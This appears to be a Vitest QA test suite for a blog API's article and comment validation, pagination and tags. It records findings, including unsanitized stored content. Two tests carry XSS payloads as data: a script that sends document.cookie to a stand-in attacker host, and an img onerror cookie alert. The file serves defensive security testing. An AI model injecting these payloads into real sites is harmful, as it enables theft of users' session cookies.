import { describe, test, expect, beforeAll } from "vitest";
import { request, registerAndLogin } from "./helpers.js";

let user;

beforeAll(async () => {
  user = await registerAndLogin();
});

describe("Article input validation", () => {
  test("missing title returns 422", async () => {
    const res = await request("POST", "/articles", {
      token: user.token,
      body: { article: { description: "d", body: "b", tagList: [] } },
    });
    expect(res.status).toBe(422);
  });

  test("missing description returns 422", async () => {
    const res = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title: `T-${Date.now()}`, body: "b", tagList: [] } },
    });
    expect(res.status).toBe(422);
  });

  test("missing body returns 422", async () => {
    const res = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title: `T-${Date.now()}`, description: "d", tagList: [] } },
    });
    expect(res.status).toBe(422);
  });

  test("omitting tagList entirely is accepted (defaults to no tags)", async () => {
    const res = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title: `NoTags-${Date.now()}`, description: "d", body: "b" } },
    });
    expect(res.status).toBe(201);
    expect(res.body.article.tagList).toEqual([]);
  });

  test("FINDING: no length limit enforced on title/body — a 20,000 character body is accepted as-is", async () => {
    const longBody = "x".repeat(20000);
    const res = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title: `Long-${Date.now()}`, description: "d", body: longBody, tagList: [] } },
    });
    expect(res.status).toBe(201);
    expect(res.body.article.body.length).toBe(20000);
  });

  test("SECURITY FINDING: a <script> payload in the article body is stored and echoed back unescaped (no server-side sanitization)", async () => {
    const payload = '<script>document.location="https://attacker.test/steal?c="+document.cookie</script>';
    const res = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title: `XSS-${Date.now()}`, description: "d", body: payload, tagList: [] } },
    });
    expect(res.status).toBe(201);
    expect(res.body.article.body).toBe(payload);

    const read = await request("GET", `/articles/${res.body.article.slug}`, {});
    expect(read.body.article.body).toBe(payload);
  });

  test("duplicate article title (same slug) is rejected", async () => {
    const title = `Dup-${Date.now()}`;
    const first = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title, description: "d", body: "b", tagList: [] } },
    });
    expect(first.status).toBe(201);

    const second = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title, description: "d2", body: "b2", tagList: [] } },
    });
    expect(second.status).toBe(422);
  });
});

describe("Comment input validation", () => {
  let slug;

  beforeAll(async () => {
    const article = await request("POST", "/articles", {
      token: user.token,
      body: { article: { title: `ForComments-${Date.now()}`, description: "d", body: "b", tagList: [] } },
    });
    slug = article.body.article.slug;
  });

  test("empty comment body returns 422", async () => {
    const res = await request("POST", `/articles/${slug}/comments`, {
      token: user.token,
      body: { comment: { body: "" } },
    });
    expect(res.status).toBe(422);
  });

  test("missing comment body returns 422", async () => {
    const res = await request("POST", `/articles/${slug}/comments`, {
      token: user.token,
      body: { comment: {} },
    });
    expect(res.status).toBe(422);
  });

  test("SECURITY FINDING: HTML/script payload in a comment is stored and echoed back unescaped", async () => {
    const payload = '<img src=x onerror="alert(document.cookie)">';
    const res = await request("POST", `/articles/${slug}/comments`, {
      token: user.token,
      body: { comment: { body: payload } },
    });
    expect(res.status).toBe(201);
    expect(res.body.comment.body).toBe(payload);
  });

  test("commenting on a nonexistent article returns 404", async () => {
    const res = await request("POST", "/articles/does-not-exist-qa/comments", {
      token: user.token,
      body: { comment: { body: "hi" } },
    });
    expect(res.status).toBe(404);
  });
});

describe("Article listing / pagination", () => {
  beforeAll(async () => {
    for (let i = 0; i < 4; i += 1) {
      await request("POST", "/articles", {
        token: user.token,
        body: { article: { title: `Page-${Date.now()}-${i}`, description: "d", body: "b", tagList: [] } },
      });
    }
  });

  test("default limit returns at most 3 (spec default) articles", async () => {
    const res = await request("GET", "/articles?limit=3&offset=0", { token: user.token });
    expect(res.status).toBe(200);
    expect(res.body.articles.length).toBeLessThanOrEqual(3);
  });

  test("FINDING: offset is multiplied by limit server-side (offset=1&limit=2 skips 2, not 1)", async () => {
    const page0 = await request("GET", "/articles?limit=2&offset=0", { token: user.token });
    const page1 = await request("GET", "/articles?limit=2&offset=1", { token: user.token });
    expect(page0.status).toBe(200);
    expect(page1.status).toBe(200);
    // The two pages must not overlap if offset behaves as "skip N*limit".
    const slugsPage0 = page0.body.articles.map((a) => a.slug);
    const slugsPage1 = page1.body.articles.map((a) => a.slug);
    const overlap = slugsPage0.filter((s) => slugsPage1.includes(s));
    expect(overlap.length).toBe(0);
  });

  test("anonymous listing works and returns favorited=false for every article", async () => {
    const res = await request("GET", "/articles?limit=5&offset=0", {});
    expect(res.status).toBe(200);
    for (const article of res.body.articles) {
      expect(article.favorited).toBe(false);
    }
  });
});

describe("Tags", () => {
  test("GET /tags works anonymously and returns a plain string array", async () => {
    const res = await request("GET", "/tags", {});
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body.tags)).toBe(true);
  });
});
